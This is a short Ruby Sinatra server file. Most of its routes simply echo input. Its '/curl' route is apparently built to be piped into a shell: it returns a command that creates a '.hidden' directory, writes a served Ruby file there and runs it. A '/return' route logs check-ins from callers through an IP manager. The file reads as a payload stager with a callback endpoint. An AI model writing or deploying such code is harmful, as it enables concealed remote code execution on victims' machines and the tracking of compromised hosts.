require 'sinatra'
require './ip_manager'

manager = IpManager.new
puts ''


get '/' do
    return ok("Hello #{params[:name]}\n")
end

post '/blah' do 
    this = request.body.read.to_s
    return "#{this.to_s}\n" if this
    return "NO THIS!!\n" 
end

get '/blah/:name/hello' do
    return "Hello #{params[:name]}"
end

post '/blah/:name/hello' do
    return "Hello #{params[:name]}"
end

get '/curl' do
  # TODO if curl | sh, want to start process
  string = ""
  file_contents =  File.read('to_send/hihi')
  puts file_contents
  string += "mkdir .hidden; echo \"#{file_contents}\" > .hidden/this.rb; ruby .hidden/this.rb;"
  return ok(string)
end


post '/return' do
  this = request.body.read.to_s
  manager.add(this)
  return ok()
end

get '/hello' do
  return File.read('say_hi.rb')
end

get '*' do
    return "400"
end

def ok(message = '')
    return [200, message]
end

